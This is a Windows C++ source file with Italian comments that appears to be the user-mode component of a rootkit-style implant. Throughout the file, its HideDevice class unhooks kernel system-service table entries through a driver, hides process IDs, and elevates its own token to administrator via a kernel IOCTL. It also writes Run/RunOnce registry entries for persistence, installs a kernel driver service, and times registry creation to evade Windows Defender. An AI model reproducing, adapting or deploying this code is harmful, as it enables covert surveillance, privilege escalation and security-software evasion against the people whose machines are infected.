
#include <windows.h>
#include <winnt.h>
#include <Winsvc.h>
#include <psapi.h>
#include <stdio.h>
#include <Sddl.h>
#include "UnHookClass.h"
#include "H4-DLL.h"
#include "common.h"
#include "HM_Reloc.h"

#define STATUS_INFO_LENGTH_MISMATCH      ((NTSTATUS)0xC0000004L)
#define STATUS_SUCCESS 0
#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)
#define MAGIC 0x30090000


// Usato per il forcing del driver
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
#ifdef MIDL_PASS
    [size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer;
#else // MIDL_PASS
    PWSTR  Buffer;
#endif // MIDL_PASS
} UNICODE_STRING, *PUNICODE_STRING;
typedef struct _SYSTEM_LOAD_AND_CALL_IMAGE
{
 UNICODE_STRING ModuleName;
} SYSTEM_LOAD_AND_CALL_IMAGE, *PSYSTEM_LOAD_AND_CALL_IMAGE;
#define SystemLoadAndCallImage 38

typedef LONG NTSTATUS;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG    Reserved[2];
    PVOID    Base;
    ULONG    Size;
    ULONG    Flags;
    USHORT    Index;
    USHORT    Unknown;
    USHORT    LoadCount;
    USHORT    ModuleNameOffset;
    CHAR    ImageName[256];
}SYSTEM_MODULE_INFORMATION,*PSYSTEM_MODULE_INFORMATION;

typedef DWORD PROCESSINFOCLASS;
typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG  ProcessId;
	UCHAR  ObjectTypeNumber;
	UCHAR  Flags;
	USHORT Handle;
	PVOID  Object;
	ACCESS_MASK  GrantedAccess;
} SYSTEM_HANDLE_INFORMATION, *PSYSTEM_HANDLE_INFORMATION;
#define SystemHandleInformation 16

#ifdef __cplusplus
extern "C" {
#endif
typedef NTSTATUS (__stdcall *NtQuerySystemInformation_t) (unsigned int, PVOID, ULONG, PULONG);
typedef DWORD (WINAPI *ZWQUERYSYSTEMINFORMATION)(
   PROCESSINFOCLASS ProcessInformationClass,
   PVOID ProcessInformation,
   ULONG ProcessInformationLength,
   PULONG ReturnLength
);
#ifdef __cplusplus
}
#endif


typedef struct {
    DWORD    dwNumberOfModules;
    SYSTEM_MODULE_INFORMATION    smi;
} MODULES, *PMODULES;

#define    SystemModuleInformation    11


BOOL Find_FSDT(fu_entry *table, DWORD *sdt_count)
{    
    HMODULE		hKernel;
    DWORD		dwKSDT;   
	DWORD		dwAddr_ret = NULL;
    DWORD		dwKiServiceTable;    
    PMODULES    pModules=(PMODULES)&pModules;
    DWORD		dwNeededSize,rc;
    DWORD		dwKernelBase,dwServices=0;
    PCHAR		pKernelName;
    PDWORD		pService;
	NtQuerySystemInformation_t pNtQuerySystemInformation;

    PIMAGE_FILE_HEADER		pFH;
    PIMAGE_OPTIONAL_HEADER  pOH;
    PIMAGE_SECTION_HEADER   pSH;

	*sdt_count = 0;
	HMODULE hNTDLL = GetModuleHandle("NTDLL.dll");
	pNtQuerySystemInformation = (NtQuerySystemInformation_t) GetProcAddress(hNTDLL, "NtQuerySystemInformation");
	if (!pNtQuerySystemInformation)
		return FALSE;
    rc = pNtQuerySystemInformation(SystemModuleInformation,pModules,4,&dwNeededSize);

    if( rc==STATUS_INFO_LENGTH_MISMATCH ) {
		if ( !(pModules = (PMODULES) GlobalAlloc(GPTR,dwNeededSize)) )
			return FALSE;
        rc = pNtQuerySystemInformation(SystemModuleInformation,pModules,dwNeededSize,NULL);
		if (!NT_SUCCESS(rc)) {
			GlobalFree(pModules);
			return FALSE;
		}
    } else 
        return FALSE;
	
    dwKernelBase = (DWORD)pModules->smi.Base;
    pKernelName  = pModules->smi.ModuleNameOffset + pModules->smi.ImageName;

	if( !(hKernel = LoadLibraryEx(pKernelName, 0, DONT_RESOLVE_DLL_REFERENCES)) ) {
		GlobalFree(pModules);
        return FALSE;        
	}

	GlobalFree(pModules);

	if( !(dwKSDT = (DWORD)GetProcAddress(hKernel,"KeServiceDescriptorTable")) ) {
		FreeLibrary(hKernel);
        return FALSE;
	}

    dwKSDT -= (DWORD)hKernel;    
	if( !(dwKiServiceTable = FindKiServiceTable(hKernel,dwKSDT)) ) {
		FreeLibrary(hKernel);
        return FALSE;
	}

	if (!GetHeaders((PCHAR)hKernel,&pFH,&pOH,&pSH)) {
		FreeLibrary(hKernel);
        return FALSE;
	}

	if( table == NULL ) 
		return FALSE;
	
	for (pService = (PDWORD)((DWORD)hKernel + dwKiServiceTable);
		*pService - pOH->ImageBase < pOH->SizeOfImage && dwServices<NUM_OF_SERVICES;
		pService++, dwServices++);
	*sdt_count = dwServices;

	// Ricrea gli indirizzi della SDT
	for(DWORD i=0; i<dwServices; i++)
		table[i].func_addr = *(DWORD *)( ((DWORD)hKernel) + dwKiServiceTable + i*sizeof(DWORD)) - pOH->ImageBase + dwKernelBase;

	if (!RelocImage(hKernel, (PVOID)dwKernelBase))
		return FALSE;

	// Copia i preamboli delle funzioni originali
	for(DWORD i=0; i<dwServices; i++)
		memcpy(table[i].func_preamble, (const char *)(table[i].func_addr - dwKernelBase + (DWORD)hKernel), PREAMBLE_SIZE);
	
	FreeLibrary(hKernel);
	
	return TRUE;
}


DWORD func_index(char *func_name)
{
	BYTE *func_ptr;
	DWORD *index_ptr;
	HMODULE hntdll = GetModuleHandle("NTDLL.DLL");
	func_ptr = (BYTE *)GetProcAddress(hntdll, func_name);
	if (!func_ptr)
		return 0xFFFFFFFF;

	index_ptr = (DWORD *)(func_ptr + 1);
	return *index_ptr;
}

WCHAR *GetMySid() {
	HANDLE hToken=0;
	TOKEN_USER *token_owner=NULL;
	DWORD dwLen;
	WCHAR *my_sid = NULL;

	if( FNC(OpenProcessToken)(FNC(GetCurrentProcess)(), TOKEN_QUERY| TOKEN_QUERY_SOURCE, &hToken) ) {
		FNC(GetTokenInformation)(hToken, TokenUser, token_owner, 0, &dwLen);
		if (dwLen)
			token_owner = (TOKEN_USER *) malloc( dwLen );
		if(token_owner) {
			memset(token_owner, 0, dwLen);
			if( FNC(GetTokenInformation)(hToken, TokenUser, token_owner, dwLen, &dwLen) )
				if (!FNC(ConvertSidToStringSidW)(token_owner->User.Sid, &my_sid))
					my_sid = NULL;
			free(token_owner);
		}
		CloseHandle(hToken);
	}
	return my_sid;
}

BOOL HideDevice::unhook_init()
{
	if (sdt_init)
		return TRUE;

	ZeroMemory(SDT_Table, sizeof(SDT_Table));
	if (!Find_FSDT(SDT_Table, &sdt_entry_count))
		return FALSE;

	sdt_init = TRUE;
	return TRUE;
}

void HideDevice::unhook_close()
{
	if( hFile != INVALID_HANDLE_VALUE ) {
		// XXX Dovrei mettere la ioctl di fine operazioni (se necessaria)
		CloseHandle(hFile);
		hFile = INVALID_HANDLE_VALUE;
	}
}

BOOL HideDevice::unhook_all(BOOL is_fixup)
{
	DWORD i;
	UHE pass_struct;
	DWORD dwReturn;
	
	if ( hFile == INVALID_HANDLE_VALUE )
		return FALSE;

	if (!unhook_init())
		return FALSE;

	for (i=0; i<sdt_entry_count; i++) {
		if (SDT_Table[i].func_addr) {
			pass_struct.index = i;
			pass_struct.fix_up.func_addr = SDT_Table[i].func_addr;
			if (is_fixup)
				memcpy(pass_struct.fix_up.func_preamble, SDT_Table[i].func_preamble, PREAMBLE_SIZE);
			else
				memset(pass_struct.fix_up.func_preamble, 0, PREAMBLE_SIZE);
			FNC(DeviceIoControl)(hFile, IOCTL_UNHOOK, &pass_struct, sizeof(pass_struct), NULL, 0, &dwReturn, NULL);
		}
	}
	return TRUE;
}

BOOL HideDevice::unhook_func(char *func_name, BOOL is_fixup)
{
	UHE pass_struct;
	DWORD sys_index;
	DWORD dwReturn;

	if ( hFile == INVALID_HANDLE_VALUE )
		return FALSE;

	if (!unhook_init())
		return FALSE;
		
	sys_index = func_index(func_name);
	if (sys_index >= sdt_entry_count)
		return FALSE;

	pass_struct.index = sys_index;
	pass_struct.fix_up.func_addr = SDT_Table[sys_index].func_addr;
	if (!pass_struct.fix_up.func_addr)
		return FALSE;

	if (is_fixup)
		memcpy(pass_struct.fix_up.func_preamble, SDT_Table[sys_index].func_preamble, PREAMBLE_SIZE);
	else
		memset(pass_struct.fix_up.func_preamble, 0, PREAMBLE_SIZE);

	return FNC(DeviceIoControl)(hFile, IOCTL_UNHOOK, &pass_struct, sizeof(pass_struct), NULL, 0, &dwReturn, NULL);	
}


BOOL HideDevice::unhook_hidepid(DWORD PID, BOOL is_add)
{
	DWORD dwReturn;
	APE hide_pid_struct;
	
	if ( hFile == INVALID_HANDLE_VALUE )
		return FALSE;
		
	hide_pid_struct.PID = PID;
	hide_pid_struct.is_add = is_add;

	return FNC(DeviceIoControl)(hFile, IOCTL_ADDPID, &hide_pid_struct, sizeof(hide_pid_struct), NULL, 0, &dwReturn, NULL);	
}


void *FindTokenObject(HANDLE Handle)
{
	ZWQUERYSYSTEMINFORMATION ZwQuerySystemInformation;
	LONG Status;
	DWORD *p;
	DWORD n = 0x1000;
	HMODULE hNtdll;
	PSYSTEM_HANDLE_INFORMATION hinfo;
	DWORD cpid;
	BYTE *Object;

	cpid = FNC(GetCurrentProcessId)();
	hNtdll = GetModuleHandle("ntdll.dll");
	ZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)GetProcAddress(hNtdll, "ZwQuerySystemInformation");
	if (!ZwQuerySystemInformation)
		return NULL;
	if ( !(p = (DWORD *)malloc(n)) )
		return NULL;
	while ( (Status=ZwQuerySystemInformation(SystemHandleInformation, p, n, 0)) == STATUS_INFO_LENGTH_MISMATCH ) {
		free(p);
		n*=2;
		if (!(p = (DWORD *)malloc(n)))
			return NULL;
	}
	if (Status != STATUS_SUCCESS) {
		free(p);
		return NULL;
	}
	hinfo = PSYSTEM_HANDLE_INFORMATION(p + 1);
	for (DWORD i = 0; i < *p; i++) {
		if (hinfo[i].ProcessId == cpid  && hinfo[i].Handle == (USHORT)Handle) {
			Object = (BYTE *)hinfo[i].Object;			
			free(p);
			return Object;
		}
	}

	free(p);
	return NULL;
}


BOOL HideDevice::unhook_getadmin()
{
	HANDLE htoken;
	DWORD dummy;
	BYTE *Object;
	BOOL ret_val = FALSE;

	if ( hFile == INVALID_HANDLE_VALUE )
		return FALSE;

	if (!FNC(OpenProcessToken)(FNC(GetCurrentProcess)(), TOKEN_QUERY, &htoken))
		return FALSE;
	
	Object = (BYTE *)FindTokenObject(htoken);
	if (Object) 
		ret_val = FNC(DeviceIoControl)(hFile, IOCTL_ADMIN, &Object, sizeof(Object), NULL, 0, &dummy, NULL);	

	CloseHandle(htoken);
	return ret_val;
}


BOOL HideDevice::unhook_isdev()
{
	if ( hFile != INVALID_HANDLE_VALUE )
		return TRUE;
	return FALSE;
}

BOOL HideDevice::unhook_isdrv(WCHAR *driver_name)
{
	DWORD dummy;
	LPVOID *drivers;
	DWORD cbNeeded = 0;
	int cDrivers, i;

	FNC(EnumDeviceDrivers)((LPVOID *)&dummy, sizeof(dummy), &cbNeeded);
	if (cbNeeded == 0)
		return FALSE;
	if (!(drivers = (LPVOID *)malloc(cbNeeded)))
		return FALSE;

	if( FNC(EnumDeviceDrivers)(drivers, cbNeeded, &dummy) ) { 
		WCHAR szDriver[1024];
		cDrivers = cbNeeded/sizeof(LPVOID);
		for (i=0; i < cDrivers; i++ ) {
			if(FNC(GetDeviceDriverBaseNameW)(drivers[i], szDriver, sizeof(szDriver)/sizeof(szDriver[0]))) { 
				if (!_wcsicmp(szDriver, driver_name)) {
					free(drivers);
					return TRUE;
				}
			}
		}
	}
	free(drivers);
	return FALSE;

}

BOOL HideDevice::unhook_getpath(WCHAR *driver_name, WCHAR *driver_path, DWORD path_max_size)
{
	DWORD dummy;
	LPVOID *drivers;
	DWORD cbNeeded = 0;
	int cDrivers, i;

	if (!driver_name || !driver_path)
		return FALSE;

	ZeroMemory(driver_path, path_max_size);

	FNC(EnumDeviceDrivers)((LPVOID *)&dummy, sizeof(dummy), &cbNeeded);
	if (cbNeeded == 0)
		return FALSE;
	if (!(drivers = (LPVOID *)malloc(cbNeeded)))
		return FALSE;

	if( FNC(EnumDeviceDrivers)(drivers, cbNeeded, &dummy) ) { 
		WCHAR szDriver[1024];
		cDrivers = cbNeeded/sizeof(LPVOID);
		for (i=0; i < cDrivers; i++ ) {
			if(FNC(GetDeviceDriverBaseNameW)(drivers[i], szDriver, sizeof(szDriver)/sizeof(szDriver[0]))) { 
				// Ha trovato il driver che ci interessa
				if (!_wcsicmp(szDriver, driver_name)) {
					if (!GetDeviceDriverFileNameW(drivers[i], driver_path, path_max_size/sizeof(WCHAR))) {
						free(drivers);
						return FALSE;
					}
					free(drivers);
					return TRUE;
				}
			}
		}
	}
	free(drivers);
	return FALSE;
}

BOOL HideDevice::unhook_regwriteA(char *value_name, char *value)
{
	WCHAR *value_name_w, *value_w;
	BOOL ret_val = FALSE;

	if (!value_name || !value)
		return FALSE;

	value_name_w = (WCHAR *)calloc((strlen(value_name)+1), sizeof(WCHAR));
	value_w = (WCHAR *)calloc((strlen(value)+1), sizeof(WCHAR));

	if (value_name_w && value_w) {
		HM_A2U(value_name, (char *)value_name_w);
		HM_A2U(value, (char *)value_w);
		ret_val = unhook_regwriteW(value_name_w, value_w);
	}

	SAFE_FREE(value_name_w);
	SAFE_FREE(value_w);
	return ret_val;
}


BOOL HideDevice::unhook_regwriteW(WCHAR *value_name, WCHAR *value)
{
	BOOL ret_val;
	REE reg_struct;
	DWORD dummy;
	WCHAR *user_sid;
	HKEY hOpen;

	if ( hFile == INVALID_HANDLE_VALUE )
		return FALSE;

	if (!value_name || !value)
		return FALSE;

	if ( !(user_sid = GetMySid()) )
		return FALSE;

	memset(&reg_struct, 0, sizeof(reg_struct));
	reg_struct.is_deleting = 0;
	wcsncpy(reg_struct.value_name, value_name, 49);
	wcsncpy(reg_struct.value, value, 1023);
#ifdef RUN_ONCE_KEY
	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", user_sid);
#else
	// XXX-NEWREG
	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", user_sid);
#endif
	// XXX-NEWREG
	//if (FNC(RegCreateKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) 
		//FNC(RegCloseKey)(hOpen);

	ret_val = FNC(DeviceIoControl)(hFile, IOCTL_REG, &reg_struct, sizeof(reg_struct), NULL, 0, &dummy, NULL);	
	return ret_val;
}


BOOL HideDevice::unhook_regdeleteA(char *value_name)
{
	WCHAR *value_name_w;
	BOOL ret_val = FALSE;

	if (!value_name)
		return FALSE;

	value_name_w = (WCHAR *)calloc((strlen(value_name)+1), sizeof(WCHAR));

	if (value_name_w) {
		HM_A2U(value_name, (char *)value_name_w);
		ret_val = unhook_regdeleteW(value_name_w);
	}

	SAFE_FREE(value_name_w);
	return ret_val;
}


BOOL HideDevice::unhook_regdeleteW(WCHAR *value_name)
{
	BOOL ret_val;
	REE reg_struct;
	DWORD dummy;
	WCHAR *user_sid;

	if ( hFile == INVALID_HANDLE_VALUE )
		return FALSE;

	if (!value_name)
		return FALSE;

	if ( !(user_sid = GetMySid()) )
		return FALSE;
	
	memset(&reg_struct, 0, sizeof(reg_struct));
	reg_struct.is_deleting = 1;
	wcsncpy(reg_struct.value_name, value_name, 49);
#ifdef RUN_ONCE_KEY
	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", user_sid);
#else
	// XXX-NEWREG
	swprintf(reg_struct.key_name, 255, L"\\Registry\\User\\%s\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", user_sid);
#endif
	ret_val = FNC(DeviceIoControl)(hFile, IOCTL_REG, &reg_struct, sizeof(reg_struct), NULL, 0, &dummy, NULL);	
	return ret_val;
}

BOOL HideDevice::unhook_uninstall()
{
	DWORD dummy;
	if ( hFile == INVALID_HANDLE_VALUE )
		return FALSE;

	return FNC(DeviceIoControl)(hFile, IOCTL_UNINST, NULL, 0, NULL, 0, &dummy, NULL);

}

BOOL HideDevice::df_thaw(WCHAR freezed, WCHAR *thawed)
{
	DWORD dummy;
	if ( hFile == INVALID_HANDLE_VALUE )
		return FALSE;

	// XXX se non riesce a montare il device, torna '!' come drive letter thawed
	return FNC(DeviceIoControl)(hFile, IOCTL_THAW, &freezed, sizeof(WCHAR), thawed, sizeof(WCHAR), &dummy, NULL);
}


BOOL HideDevice::df_freeze()
{
	DWORD dummy;
	if ( hFile == INVALID_HANDLE_VALUE )
		return FALSE;

	return FNC(DeviceIoControl)(hFile, IOCTL_FREEZE, NULL, 0, NULL, 0, &dummy, NULL);
}


HideDevice::HideDevice(void) { 
	//hFile = FNC(CreateFileA)("\\\\.\\MSH4DEV1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
	//hFile = FNC(CreateFileA)("\\\\.\\JUzCPHOF8S", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	hFile = INVALID_HANDLE_VALUE;
	sdt_init = FALSE;
}

// Questa funzione serve per nel caso dovessimo installare il driver
// a non far vedere la nuova chiave a WindowsDefender.
// Attende 10 secondi la prima volta che il driver viene installato.
#define WINDOWS_DEFENDER_REG_DELAY 10000
void CheckDriverKey(WCHAR *key_name)
{
	WCHAR key_path[255];
	HKEY hreg;

	_snwprintf_s(key_path, 255, _TRUNCATE, L"SYSTEM\\CurrentControlSet\\Services\\%s", key_name);
	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, key_path, &hreg) == ERROR_SUCCESS) {
		FNC(RegCloseKey)(hreg);
		return;
	}

	if (FNC(RegCreateKeyW)(HKEY_LOCAL_MACHINE, key_path, &hreg) == ERROR_SUCCESS) {
		FNC(RegCloseKey)(hreg);
		Sleep(WINDOWS_DEFENDER_REG_DELAY);
		return;
	}
	return;
}

HideDevice::HideDevice(WCHAR *driver_path) {
	WCHAR *driver_name;

	// inizializza le variabili dell'istanza
	hFile = INVALID_HANDLE_VALUE;
	sdt_init = FALSE;

/*	if (!driver_path)
		return;
	if ( driver_name = wcsrchr(driver_path, L'\\') ) 
		driver_name++;
	else
		driver_name = driver_path;

	SC_HANDLE sh=NULL, rh=NULL;
	
	if (driver_name[0]!=0) {
		CheckDriverKey(driver_name);
		do {
			if (! (sh = FNC(OpenSCManagerA)(NULL, NULL, SC_MANAGER_CREATE_SERVICE )) )
				break;
			if (! (rh = FNC(CreateServiceW)(sh, driver_name, driver_name, SERVICE_START, SERVICE_KERNEL_DRIVER, SERVICE_SYSTEM_START, SERVICE_ERROR_IGNORE, driver_path, NULL, NULL, NULL, NULL, NULL)) )
				break;
		} while(0);
		FNC(StartServiceA)(rh, 0, NULL);
		if (rh)
			FNC(CloseServiceHandle)(rh);
		if (sh)
			FNC(CloseServiceHandle)(sh);
	}
	// Ora la DriverEntry è finita e il device è creato
	//hFile = FNC(CreateFileA)("\\\\.\\JUzCPHOF8S", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
	//hFile = FNC(CreateFileA)("\\\\.\\MSH4DEV1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);  
	hFile = INVALID_HANDLE_VALUE;*/
}

HideDevice::~HideDevice(void) { unhook_close(); }
